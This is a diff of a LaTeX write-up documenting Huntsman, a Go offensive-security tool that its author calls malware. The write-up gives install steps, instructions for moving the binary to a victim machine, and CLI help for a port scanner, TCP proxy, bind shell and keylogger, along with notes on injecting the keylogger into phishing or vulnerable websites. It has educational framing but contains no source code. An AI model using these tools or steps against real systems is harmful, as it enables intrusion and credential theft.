@@ -14,21 +14,21 @@
 
 \begin{document}
 \maketitle
-%\includegraphics{logo}
+\includegraphics[width=12cm, height=7cm]{logo}
 
 \section{Introduction}
-The term Malware is an acronym for Malicious Software, which is software that is used to harm or exploit any electronic device or network, causing chaos. 
-Programming is the way of writing down thoughts and logic, in a way the computers can understand, and while writing a program there is always a scope of introducing errors and flaws or missing out on potentially dangerous scenarios. These flaws in the program are what hackers call vulnerability, and they exploit these bugs to make it behave in a way the programmer never intended. Malware is the way hackers talk to the computer to satisfy this goal. Hence, writing malware is an art to exploit the error in thinking. 
-Huntsman is a malware, which was created keeping speed and efficiency in mind because at the end of the day malware is also a software, a malicious one.
+The term Malware is an acronym for Malicious Software, which is software that is used to harm or exploit any electronic device or network, causing chaos, either for fun or profit!\\
+Programming is the way of writing down thoughts and logic, in a way the computers can understand and perform a task accordingly. While writing a program there is always a scope of introducing flaws which happens mostly due to gap in knowledge or lack of awareness against potentially dangerous scenarios. These flaws in the program are what hackers call vulnerability, and they exploit these bugs to make it behave in a way the programmer never intended. Malware is the way hackers talk to the computer to satisfy this goal. Hence, writing malware is an art to exploit the error in thinking. 
 
 \section{Huntman}
 \subsection{What is it} 
-Huntsman is a malware, which was created keeping speed and efficiency in mind because at the end of the day malware is also a software, a malicious one.  
-Huntsman is a malware, which was created keeping speed and efficiency in mind because at the end of the day malware is also a software, a malicious one.
+Huntsman is a malware, which was created keeping speed and efficiency in mind because at the end of the day malware is also a software, a malicious one.\\ 
+It also can be used as a reference for learning how malwares are built and used. 
 
-\subsection{Unique features of Huntsman}
-Huntsman in written in a language called golang and below are the highlights of what makes it a special kind of malware:  
+\subsection{Unique characteristics of Huntsman}
+The following are the unique traits of Huntsman that sets it apart from others in the genre:
 \begin{itemize}
+	\item Golang: Huntsman is written in a modern language called Go which is very robust yet simple, hence invites contribution from wider range of audience instead of inculcating tech debt by using older but widely used languages. 
 	\item Fast and concurrent: Our CPUs are not getting any faster as Moore’s law is dead, hence the way we can improve on processing is by reducing the latency introduced by I/O operations by adding more and more cache memory and using multiple CPUs instead of one. But, both these factors have a limit as to how large the cache can be and how many cores can be added. Hence software can be made faster by concurrently running pieces of a process (called thread). Golang takes care of this aspect well and hence Huntsman can be said to be an efficient concurrent software.  
 
 	\item Single executable binary: Once you find a vulnerability in a system and want to exploit it using a malware, you need to reduce the time required to place the binary at the intended place. Hence having a single binary can that execute on the system is very useful as you can there is nothing else to take care of. You just place it there and start exploiting, no dependencies involved!
@@ -43,46 +43,57 @@ Huntsman in written in a language called golang and below are the highlights of 
 \section{Installation}
 There multiple ways in which you can install `huntsman` on your machine or a target machine.  
 \begin{enumerate}
-	\item Install it using golang compiler using `go install` or `go build`
+	\item Install it using golang compiler using \verb|go install| or \verb|go build|
 	\begin{enumerate}
-		\item Install Golang
+		\item Install Golang from the official website [1]
 		\item \verb|git clone git@github.com:souvikhaldar/huntsman.git|
 		\item \verb|cd huntsman|
 		\item \verb|go install|
 	\end{enumerate}
 
-	\item Download the binary from RELEASES and save it on on PATH.  
+	\item Install it on PATH.\\
+		Download binary appropriate for the system to be installed on, then put the downloaded binary at a location which is mentioned in the \verb|PATH| variable. The paths in the \verb|PATH| variable is typically put in the shell file (either .bashrc or .zshrc, depending on the shell being used) and sourced at the startup of the machine.
 
-	\item Use the `goinstaller.py` script.  
+	\item Use the `goinstaller.py` script. \\ 
+		You can use the \verb|goinstaller.py| python3 script (make sure you have Python3 installed on the system) to compile Huntsman and generate binary for the target system on which you would like to run. For example, you can use the script on Mac machine to generate binary for a linux system, then copy the binary for that machine and execute it there. The help page for the script is:\\
 		\begin{verbatim}
 		./goinstaller.py --help 
 		Install go program for multiple OS and multiple architectures
 		Run goinstaller.py --help for all options
 		usage: goinstaller.py [-h]
-				      [--os {all,popular,linux,darwin,windows,dragonfly,android,freebsd,netbsd,openbsd,plan9,solaris,aixjs}]
-				      [--arch {all,popular,amd64,386,arm,ppc64,arm64,ppc64le,mips,mipsle,mips64,mips64le,s390x}]
+				      [--os {all,popular,linux,darwin,windows,
+				      dragonfly,android,freebsd,netbsd,openbsd,
+				      plan9,solaris,aixjs}]
+				      [--arch {all,popular,amd64,386,arm,ppc64,
+				      arm64,ppc64le,mips,
+				      mipsle,mips64,mips64le,s390x}]
 				      [--source SOURCE] [--target TARGET]
 
 		optional arguments:
 		  -h, --help            show this help message and exit
-		  --os {all,popular,linux,darwin,windows,dragonfly,android,freebsd,netbsd,openbsd,plan9,solaris,aixjs}
+		  --os {all,popular,linux,darwin,windows,dragonfly,android,
+		  freebsd,netbsd,openbsd,plan9,solaris,aixjs}
 					The target OS. Eg. all,linux,darwin,windows,etc
-		  --arch {all,popular,amd64,386,arm,ppc64,arm64,ppc64le,mips,mipsle,mips64,mips64le,s390x}
+		  --arch {all,popular,amd64,386,arm,ppc64,arm64,ppc64le,
+		  mips,mipsle,mips64,mips64le,s390x}
 					The target's architecture. Eg. all,amd64,386,etc
-		  --source SOURCE       The directory where source source is present
-		  --target TARGET       The target dir where the binary needs to be stored
+		  --source SOURCE       The directory where source source 
+		  is present
+		  --target TARGET       The target dir where the binary 
+		  needs to be stored
 		\end{verbatim}
 	Eg. Compiling for \textbf{popular} OSes like Windows, Microsoft and Linux for 64-bit architecture can be done using
 		\begin{verbatim}
-	./goinstaller.py --target ./download --os popular --arch amd64
+		./goinstaller.py --target ./download --os popular --arch amd64
 		\end{verbatim}
 
-	\item Using docker
+	\item Using docker\\
 	You can run Huntsman in docker as well.\\
 	\verb|docker pull souvikhaldar/huntsman:0.6|
 \end{enumerate}
 
 		\section{Transfer to a target}
+You would probably not like to run the malware on your own system! So transferring the compiled binary on the target machine is important step. You can transfer via multiple methods. One of the primary objective behind a versatile, light-weight, cross-platform malware like Huntsman was that, once you are in a state where you can send and execute arbitrary software on a machine (which is probably the hardest step) you don't need to wait for some particular malware to suit your need and have an allrounder ready!\\
 Once you've compiled huntsman for the target OS and arch, you can transfer it 
 using `scp` or any tool of choice, for exploiting the victim.  
 Eg, transferring linux binary to target machine:  
@@ -101,7 +112,8 @@ Huntsman allows you to find if a computer has any open port to the internet, bec
 \begin{verbatim}
 huntsman portscan --help
 
-Concurrently scan the provided range (by default 0 to 65535) to check if any port is open
+Concurrently scan the provided range (by default 0 to 65535) 
+to check if any port is open
 
 Usage:
   huntsman portscan [flags]
@@ -110,8 +122,10 @@ Flags:
   -e, --end int32       last port number (default 65535)
   -h, --help            help for portscan
   -s, --start int32     starting port number (default 1)
-      --target string   IP/URL address of the machine to be scanned
-  -t, --threads int32   the number of goroutines to execute at a time (default 100)
+      --target string   IP/URL address of the machine to be 
+      scanned
+  -t, --threads int32   the number of goroutines to execute 
+  at a time (default 100)
 \end{verbatim}
 
 \subsection{TCP proxy}
@@ -128,9 +142,12 @@ Usage:
 
 Flags:
   -h, --help                    help for proxy
-  -s, --port string             The port at which this proxy should run (default "8192")
-  -t, --target-address string   Destination to forward traffic to
-  -p, --target-port string      The port of the destination, eg 8192,80 (default "80")
+  -s, --port string             The port at which 
+  this proxy should run (default "8192")
+  -t, --target-address string   Destination to forward 
+  traffic to
+  -p, --target-port string      The port of the 
+  destination, eg 8192,80 (default "80")
 \end{verbatim}
 
 An example of using huntsman as TCP proxy is:\\
@@ -149,7 +166,8 @@ Usage:
 
 Flags:
   -h, --help          help for listen
-      --port string   Port at which listener should run (default "8192")
+      --port string   Port at which listener should run 
+      (default "8192")
 \end{verbatim}
 An example command to turn Huntsman into a TCP listener is:\\
 \verb|huntsman listen port=8192| \\	
@@ -179,13 +197,17 @@ Usage:
 Flags:
   -h, --help          help for bindshell
       --port string
-                      	The port on which this bind shell listen for coommands
-                      	 (default "13337")
+                      	The port on which this bind shell listen 
+			for coommands
+                      	 (default "13337")s				
 \end{verbatim}
 
 Youtube link for the \href{https://youtu.be/eE0k0GVZXyc}{video demonstration of the working of the bind shell}\\
 \textit{NOTE: I've used the term reverse shell for bind shell in the video, which is wrong, in reverse shell the victim machine connects with the client for taking commands}
 
+The following screenshot shows that I've gained a bind shell into a linux machine (and also a Raspberry Pi running Linux) on my Mac machine:\\
+
+\includegraphics[width=12cm, height=7cm]{bind}
 \subsection{Keylogger}
 
 A keylogger can log the keystrokes made by a user ,typically on a website. The logged keystrokes most of the times are crucial credentials of the users. Hackers use Credential Harvester (like keylogger) to steal your credentials.
@@ -195,8 +217,9 @@ Huntsman is the tool that contains a keylogger as well.\\
 huntsman keylogger --help
 
 This will run a keylogger server (a websocket) which also renders
-	a HTML (with JS) client that captures the keystrokes and send them to
-	this server, so we can know whatever the user is typing on that webpage
+	a HTML (with JS) client that captures the keystrokes and send 
+	them to	this server, so we can know whatever the user is typing 
+	on that webpage
 
 Usage:
   huntsman keylogger [flags]
@@ -204,21 +227,48 @@ Usage:
 Flags:
   -h, --help                   help for keylogger
   -l, --listener-port string
-                               	The port at which the listener server should run on this machine
-                               	 (default "8192")
-  -w, --ws-addr string         address of the websocket server (default "localhost:8192")
+                               	The port at which the listener server 
+				should run on this machine (default "8192")
+  -w, --ws-addr string         address of the websocket server 
+  (default "localhost:8192")
 \end{verbatim}
 
 
 \verb|huntsman keylogger -w localhost:8192 -l 8192|
 
-Using the above command you can run the keylogger, which will log all the inputs made to the HTML file named \textbf{logger.html} in the Huntsman github repository. The thing special about this html file is that it makes a websocket connection to the Huntsman keylogger websocket server and sends each keystoke to the server. In practical scenarios you need to have either a custom website which has this feature built into it (typically the phising websites) or find vulnerability in the website to inject this websocket connection to our huntsman keylogger server.
+Using the above command you can run the keylogger, which will log all the inputs made to the HTML file named \textbf{logger.html} in the Huntsman github repository. The thing special about this html file is that it makes a websocket connection to the Huntsman keylogger websocket server and sends each keystoke to the server. In practical scenarios you need to have either a custom website which has this feature built into it (typically the phising websites) or find vulnerability in the website to inject this websocket connection to our huntsman keylogger server.\\
+
+\includegraphics[width=12cm, height=8cm]{keylogger}
 
 \href{https://youtu.be/BoPICq1MVhA}{This video} is the demonstration for using huntsman as a keylogger. 
 
+\section{Future Work}
+There are multiple important and well coveted features that I would love to add to Huntsman. Obviously the list in unending but following are the ones I've thought about for now. Because of the Open Source nature of Huntsman, I invite contributions from all the cyber security enthusiasts:\\
+*  Port scanner\\
+*  HTTP traffic analyzer\\
+*  TCP proxy\\
+*  TCP listener\\
+*  HTTP server\\
+*  Reverse Shell\\
+*  Keylogger\\
+*  SMB and NTLM expotation\\
+*  Abusing Databases\\
+*  Packet processing\\
+*  Fuzzing and shellcode\\
+*  Cryptography\\
+*  Windows system analysis\\
+*  Steganography\\
+*  CNC RAT\\
+
 \section{Conclusion}
 The goal of Huntsman is to be an efficient piece of software (you can call it malware instead) that can transform into the required tool for hunting according to the need. Since it is open source, anyone can contribute to it for making it the ultimate tool for offensive security. \\
+The biggest source of inspiration behind building this software is the completion of Advanced Program in Cyber Security  and Cyber Defense [2] at IIT Kanpur. The biggest source of Knowledge, reference and guide is the fantastic book \textbf{Black Hat Go}[3]! Hopefully this software will serve it noble purpose of teaching people how to identify and protect oneself against such malware and in the meantime, learn the amazing programming language Go as well!\\
 \textit{NOTE: This software was written for educational purpose, the author can not be held liable for any mishap that occurs out of it's direct or indirect usage}
 
+
+\section{References}
+1. https://golang.org/ \\
+2. https://iitk-cscd.talentsprint.com/ \\
+3. Black Hat Go, Go Programming for Hackers and Pentesters by Tom Steele, Chris Patten, and Dan Kottmann \\
 \end{document}
 
